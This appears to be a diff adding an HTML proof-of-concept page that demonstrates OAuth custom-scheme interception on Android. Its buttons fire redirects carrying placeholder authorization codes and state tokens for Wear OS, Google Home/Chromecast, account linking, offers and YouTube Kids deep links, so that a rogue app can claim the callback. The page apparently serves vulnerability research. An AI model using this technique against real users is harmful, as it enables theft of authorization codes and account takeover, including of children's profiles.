@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OAuth Redirect Simulation</title>
+<style>
+body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
+h2 { color: #f44; }
+button { background: #c00; color: white; border: none; padding: 16px 32px;
+  font-size: 18px; border-radius: 8px; margin: 12px 0; display: block; width: 100%; }
+button:active { background: #900; }
+.desc { color: #aaa; font-size: 13px; margin: 4px 0 16px 0; }
+.section { border: 1px solid #333; padding: 16px; margin: 16px 0; border-radius: 8px; }
+</style>
+</head>
+<body>
+<h2>OAuth Scheme Interception PoC</h2>
+<p>This page simulates what happens when Google's OAuth server
+redirects the browser back to the app after the user grants consent.</p>
+<p style="color:#f88">A disambiguation dialog should appear showing BOTH
+the legitimate app AND the attacker app.</p>
+
+<div class="section">
+<h3 style="color:#ff0">1. Wear OS Companion</h3>
+<p class="desc">Intercepts OAuth callback for wearable pairing / Fitbit linking</p>
+<button onclick="location.href='com.google.android.wear.companion://oauth2redirect?code=4%2F0AQSTgQF_wearos_auth_code_INTERCEPTED&state=WearCSRFToken123&scope=openid+profile+email'">
+Trigger Wear OAuth Redirect</button>
+</div>
+
+<div class="section">
+<h3 style="color:#ff0">2. Google Home OAuth</h3>
+<p class="desc">Intercepts OAuth callback for smart home service linking</p>
+<button onclick="location.href='comgooglecast://chromecast.auth.com/done?code=4%2F0AQSTgQF_chromecast_auth_code_INTERCEPTED&state=CastCSRFToken456'">
+Trigger Chromecast OAuth Redirect</button>
+</div>
+
+<div class="section">
+<h3 style="color:#ff0">3. Google Home Account Linking</h3>
+<p class="desc">Intercepts Google Account Linking redirect (GAL)</p>
+<button onclick="location.href='comgooglecast://galredirect?code=4%2F0AQSTgQF_gal_code_INTERCEPTED&state=GALState789'">
+Trigger Account Linking Redirect</button>
+</div>
+
+<div class="section">
+<h3 style="color:#ff0">4. Google Home Offers</h3>
+<p class="desc">Intercepts promotional offer completion redirect</p>
+<button onclick="location.href='comgooglecast://offers/end?code=OFFER_CODE_INTERCEPTED&promo_id=PROMO123'">
+Trigger Offers Redirect</button>
+</div>
+
+<div class="section">
+<h3 style="color:#ff0">5. YouTube Kids</h3>
+<p class="desc">Intercepts YouTube Kids deep link with child profile data</p>
+<button onclick="location.href='vnd.youtube.kids://browse?child_id=UC_CHILD_PROFILE_123&session=KidsSessionToken'">
+Trigger YouTube Kids Redirect</button>
+</div>
+
+<hr style="border-color:#333">
+<p style="color:#888; font-size:11px">
+In a real attack, this redirect happens automatically after the user
+grants OAuth consent on accounts.google.com. The user never sees this page —
+they only see the disambiguation dialog asking which app should handle the redirect.
+</p>
+</body>
+</html>
